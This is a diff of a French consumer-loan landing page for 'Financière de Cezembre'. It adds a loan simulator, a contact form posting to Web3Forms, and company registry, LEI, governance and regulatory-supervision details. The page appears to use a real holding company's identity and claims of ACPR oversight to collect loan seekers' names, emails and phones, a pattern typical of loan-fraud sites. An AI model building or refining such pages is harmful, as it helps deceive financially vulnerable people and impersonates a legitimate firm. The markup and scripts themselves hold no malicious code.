@@ -8,7 +8,13 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
     <style>
-        :root { --navy: #001A4D; --gold: #C5A059; --light-bg: #F4F7FA; --white: #FFFFFF; }
+        :root {
+            --navy: #001A4D;
+            --gold: #C5A059;
+            --light-bg: #F4F7FA;
+            --white: #FFFFFF;
+        }
+
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         body { background-color: var(--white); color: #333; overflow-x: hidden; }
 
@@ -22,13 +28,6 @@
         .nav-links a { text-decoration: none; color: #666; font-size: 0.9rem; font-weight: 500; }
         .lang-btn { background: #EEE; padding: 8px 15px; border-radius: 4px; font-size: 0.8rem; cursor: pointer; display: flex; align-items: center; gap: 8px; }
 
-        #langMenu {
-            display: none; position: absolute; top: 50px; right: 0; 
-            background: white; border: 1px solid #ddd; width: 180px; 
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1); z-index: 2000;
-        }
-        #langMenu div { padding: 10px; color: #333; cursor: pointer; font-size: 0.8rem; border-bottom: 1px solid #eee; display: flex; align-items: center; gap: 8px; }
-
         .hero {
             height: 100vh; background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), 
             url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000');
@@ -38,23 +37,36 @@
         .hero-content { max-width: 600px; }
         .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
         
+        /* SIMULATEUR */
         .simulator {
             background: var(--white); padding: 40px; border-radius: 2px; width: 480px;
             box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy);
         }
-        .sim-row { margin-bottom: 25px; }
+        .sim-row { margin-bottom: 20px; }
         .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; font-size: 0.9rem; }
-        input[type="range"] { width: 100%; height: 4px; accent-color: var(--gold); cursor: pointer; }
-        
+        input[type="range"] { width: 100%; height: 4px; accent-color: var(--gold); }
         .result-area { background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; margin-bottom: 20px; }
         .result-area span { font-size: 2.2rem; font-weight: 700; color: var(--navy); }
-        
         .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
         .btn-main:hover { background: var(--gold); }
 
+        /* Formulaire étape 2 */
+        .form-input { width: 100%; padding: 12px; border: 1px solid #DDD; border-radius: 4px; margin-bottom: 10px; font-size: 0.9rem; }
+        .security-tag { text-align: center; margin-top: 15px; font-size: 0.7rem; color: #27ae60; font-weight: 600; text-transform: uppercase; }
+
         .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
+        .stat-box h3 { font-size: 2rem; color: var(--gold); }
+
         .about-section { padding: 100px 15%; line-height: 2; text-align: justify; background: var(--white); }
+        .about-section h2 { margin-bottom: 30px; color: var(--navy); text-align: center; }
+
         footer { background: #0A0A0A; color: #888; padding: 80px 8% 40px; font-size: 0.8rem; }
+        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 50px; margin-bottom: 50px; }
+        .f-grid h4 { color: white; margin-bottom: 20px; font-size: 0.9rem; }
+        .legal-block { border-top: 1px solid #222; padding-top: 40px; line-height: 1.8; }
+        .tag-warning { border: 1px solid #444; padding: 15px; margin-top: 20px; color: #AAA; text-align: center; }
+
+        #goUp { position: fixed; bottom: 30px; right: 30px; background: var(--gold); color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; display: none; }
     </style>
 </head>
 <body>
@@ -65,70 +77,114 @@
         <a href="#about">Notre Expertise</a>
         <a href="#legal">Gouvernance</a>
         <a href="#contact">Contact</a>
-        <div style="position: relative;">
-            <div class="lang-btn" id="activeLang" onclick="toggleLang()"><i class="fas fa-globe-europe"></i> FR | EU</div>
-            <div id="langMenu">
-                <div onclick="updateLang('🇫🇷 France')">🇫🇷 France</div>
-                <div onclick="updateLang('🇪🇸 Espagne')">🇪🇸 Espagne</div>
-                <div onclick="updateLang('🇮🇹 Italie')">🇮🇹 Italie</div>
-                <div onclick="updateLang('🇬🇧 Royaume-Uni')">🇬🇧 Royaume-Uni</div>
-                <div onclick="updateLang('🇩🇪 Allemagne')">🇩🇪 Allemagne</div>
-                <div onclick="updateLang('🇨🇭 Suisse')">🇨🇭 Suisse</div>
-            </div>
-        </div>
+        <div class="lang-btn"><i class="fas fa-globe-europe"></i> FR | EU</div>
     </div>
 </header>
 
 <section class="hero">
     <div class="hero-content">
         <h1>L'excellence financière <br>au service de vos projets.</h1>
-        <p>Partenaire de confiance depuis 1990. Distribution de crédit institutionnel régulé.</p>
+        <p style="margin-bottom: 30px; opacity: 0.9;">Partenaire de confiance depuis 1990. Distribution de crédit institutionnel régulé.</p>
+        <div style="display: flex; gap: 20px;">
+            <i class="fas fa-shield-check" style="color: var(--gold); font-size: 2rem;"></i>
+            <p><strong>Société immatriculée au RCS 552 058 943</strong><br>Sous la supervision des autorités bancaires françaises.</p>
+        </div>
     </div>
 
-    <form class="simulator" action="https://api.web3forms.com/submit" method="POST">
-        <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
-        
-        <h3>Simulateur de Crédit</h3>
-        <div class="sim-row">
-            <label>MONTANT <span><input type="number" id="amtNum" name="montant" value="15000" style="border:none; text-align:right; font-weight:700; width:80px;"> €</span></label>
-            <input type="range" id="amtRange" min="1000" max="75000" step="500" value="15000">
-        </div>
-        <div class="sim-row">
-            <label>DURÉE <span id="durText">36 mois</span></label>
-            <input type="range" id="durRange" name="duree" min="6" max="84" step="6" value="36">
-        </div>
-
-        <div class="result-area">
-            <span id="monthlyRes">0.00</span> <span>€/mois</span>
-            <input type="hidden" name="mensualite" id="hiddenMonthly">
-        </div>
-
-        <div style="display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px;">
-            <input type="text" name="nom" placeholder="Nom et Prénom" required style="padding: 10px; border: 1px solid #DDD;">
-            <select name="projet" required style="padding: 10px; border: 1px solid #DDD; background: white;">
-                <option value="" disabled selected>Choisir votre projet</option>
-                <option value="Personnel">Prêt Personnel</option>
-                <option value="Immobilier">Immobilier</option>
-                <option value="Auto">Auto</option>
-            </select>
-            <input type="tel" name="tel" placeholder="Téléphone" required style="padding: 10px; border: 1px solid #DDD;">
-            <input type="email" name="email" placeholder="Email" required style="padding: 10px; border: 1px solid #DDD;">
+    <div class="simulator" id="simBox">
+        <div id="step1">
+            <h3 style="margin-bottom: 30px;">Simulateur de Crédit</h3>
+            <div class="sim-row">
+                <label>MONTANT DU PROJET <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:700; width:80px; background:transparent;"> €</span></label>
+                <input type="range" id="amtRange" min="1000" max="75000" step="500" value="15000">
+            </div>
+            <div class="sim-row">
+                <label>DURÉE DU REMBOURSEMENT <span id="durText">36 mois</span></label>
+                <input type="range" id="durRange" min="6" max="84" step="6" value="36">
+            </div>
+            <div class="result-area">
+                <p style="font-size: 0.8rem; margin-bottom: 5px;">MENSUALITÉ ESTIMÉE (TAEG FIXE 3.5%)</p>
+                <span id="monthlyRes">0.00</span> <span>€</span>
+            </div>
+            <button type="button" class="btn-main" onclick="goToStep2()">DÉPOSER MON DOSSIER</button>
         </div>
 
-        <button type="submit" class="btn-main">DÉPOSER MON DOSSIER</button>
-        
-        <div style="text-align: center; font-size: 0.7rem; color: #27ae60; margin-top: 10px;">
-            <i class="fas fa-lock"></i> DOSSIER SÉCURISÉ & CONFIDENTIEL
+        <div id="step2" style="display:none;">
+            <h3 style="margin-bottom: 20px;">Finaliser votre demande</h3>
+            <form action="https://api.web3forms.com/submit" method="POST" id="loanForm">
+                <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
+                <input type="hidden" name="subject" value="Nouvelle demande de prêt - Cézembre">
+                
+                <input type="hidden" name="montant_client" id="hiddenAmt">
+                <input type="hidden" name="duree_client" id="hiddenDur">
+                <input type="hidden" name="mensualite_client" id="hiddenMens">
+
+                <input type="text" name="nom" placeholder="Nom et Prénom" class="form-input" required>
+                <select name="projet" class="form-input" required>
+                    <option value="" disabled selected>Type de projet</option>
+                    <option value="Personnel">Prêt Personnel</option>
+                    <option value="Auto">Auto / Moto</option>
+                    <option value="Travaux">Travaux</option>
+                    <option value="Consommation">Autre besoin</option>
+                </select>
+                <input type="email" name="email" placeholder="Adresse e-mail" class="form-input" required>
+                <input type="tel" name="telephone" placeholder="Téléphone" class="form-input" required>
+
+                <button type="submit" class="btn-main">ENVOYER LA DEMANDE</button>
+                
+                <div class="security-tag">
+                    <i class="fas fa-lock"></i> Transfert sécurisé SSL 256-bit
+                </div>
+                <div id="formStatus" style="margin-top:10px; font-size:0.8rem; text-align:center;"></div>
+            </form>
         </div>
-    </form>
+    </div>
+</section>
+
+<section class="stats-bar">
+    <div class="stat-box"><h3>1 200 000 €</h3><p>Capital Social</p></div>
+    <div class="stat-box"><h3>3.5%</h3><p>Taux Préférentiel</p></div>
+    <div class="stat-box"><h3>100%</h3><p>Digital & Sécurisé</p></div>
 </section>
 
 <section class="about-section" id="about">
     <h2>Une Institution de Référence</h2>
-    <p>FINANCIÈRE DE CEZEMBRE, dont le siège social est situé à Ergué-Gabéric (29500)... [Votre texte long ici]</p>
+    <p>FINANCIÈRE DE CEZEMBRE, dont le siège social est situé à Ergué-Gabéric (29500), est une société anonyme de référence dans le secteur de la distribution de crédit (Code APE 64.92Z). Fort d'un capital social de 1 200 000 euros, notre établissement assure une gestion rigoureuse des participations et des opérations financières complexes.</p>
+    <p>Sous la direction de Monsieur Michel Pajot, Président du Conseil d’administration et Directeur général, nous collaborons avec des acteurs majeurs tels que Bolloré SE et Financière Arnil pour garantir une stabilité et une expertise inégalées sur le marché européen.</p>
 </section>
 
-<a href="https://wa.me/33780976404" target="_blank" style="position: fixed; bottom: 30px; left: 30px; background: #25d366; color: white; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; text-decoration: none; z-index: 5000;"><i class="fab fa-whatsapp"></i></a>
+<footer id="legal">
+    <div class="f-grid">
+        <div>
+            <h4>FINANCIÈRE DE CEZEMBRE</h4>
+            <p>Distribution de crédit et participations financières régulées.<br>Identifiant LEI : 969500WONJGTDZG8E035</p>
+        </div>
+        <div>
+            <h4>SIÈGE SOCIAL</h4>
+            <p>ODET, 29500<br>ERGUÉ-GABÉRIC, France<br>RCS Quimper 552 058 943</p>
+        </div>
+        <div>
+            <h4>GOUVERNANCE</h4>
+            <p>Président : M. Michel Pajot<br>Administrateurs : Bolloré SE, Financière Arnil, Socotab.</p>
+        </div>
+        <div>
+            <h4>AUDIT</h4>
+            <p>Commissaire : Constantin Associés<br>Suppléant : BEAS (Paris La Défense)</p>
+        </div>
+    </div>
+
+    <div class="legal-block">
+        <strong>INFORMATIONS LÉGALES ET RÉGLEMENTAIRES :</strong><br>
+        FINANCIÈRE DE CEZEMBRE SA au capital de 1 200 000 €. SIRET 552 058 943 00044. TVA FR05552058943. 
+        Conformément à la loi française, notre activité est soumise au contrôle de l'Autorité de Contrôle Prudentiel et de Résolution (ACPR). 
+        <div class="tag-warning">
+            UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ. VÉRIFIEZ VOS CAPACITÉS DE REMBOURSEMENT AVANT DE VOUS ENGAGER.
+        </div>
+    </div>
+    <p style="text-align:center; margin-top:40px; color:#555;">&copy; 2026 FINANCIÈRE DE CEZEMBRE - Tous droits réservés.</p>
+</footer>
+
+<div id="goUp" onclick="window.scrollTo({top:0, behavior:'smooth'})"><i class="fas fa-arrow-up"></i></div>
 
 <script>
     const amtR = document.getElementById('amtRange');
@@ -136,8 +192,8 @@
     const durR = document.getElementById('durRange');
     const durT = document.getElementById('durText');
     const resM = document.getElementById('monthlyRes');
-    const hidM = document.getElementById('hiddenMonthly');
 
+    // Mise à jour du calcul
     function calc() {
         let p = parseFloat(amtR.value);
         let n = parseInt(durR.value);
@@ -146,23 +202,51 @@
         durT.innerText = n + " mois";
         let m = (p * r) / (1 - Math.pow(1 + r, -n));
         resM.innerText = m.toFixed(2);
-        hidM.value = m.toFixed(2) + " €";
+        
+        // On pré-remplit les champs cachés pour le mail
+        document.getElementById('hiddenAmt').value = p + " €";
+        document.getElementById('hiddenDur').value = n + " mois";
+        document.getElementById('hiddenMens').value = m.toFixed(2) + " €";
     }
 
-    function toggleLang() {
-        const m = document.getElementById('langMenu');
-        m.style.display = (m.style.display === 'block') ? 'none' : 'block';
-    }
-
-    function updateLang(l) {
-        document.getElementById('activeLang').innerHTML = <i class="fas fa-globe-europe"></i> ${l};
-        toggleLang();
+    // Basculer vers l'étape 2
+    function goToStep2() {
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
     }
 
     amtR.oninput = calc;
     durR.oninput = calc;
-    amtN.oninput = () => { amtR.value = amtN.value; calc(); };
+    window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
     calc();
+
+    // Envoi via Web3Forms
+    const form = document.getElementById('loanForm');
+    form.onsubmit = async (e) => {
+        e.preventDefault();
+        const status = document.getElementById('formStatus');
+        status.innerHTML = "Envoi en cours...";
+
+        const formData = new FormData(form);
+        const object = Object.fromEntries(formData);
+        const json = JSON.stringify(object);
+
+        const response = await fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json', 'Accept': 'application/json'},
+            body: json
+        });
+
+        if (response.status == 200) {
+            status.style.color = "green";
+            status.innerHTML = "Demande envoyée ! Nous reviendrons vers vous.";
+            form.reset();
+        } else {
+            status.style.color = "red";
+            status.innerHTML = "Erreur. Veuillez réessayer.";
+        }
+    };
 </script>
+
 </body>
 </html>
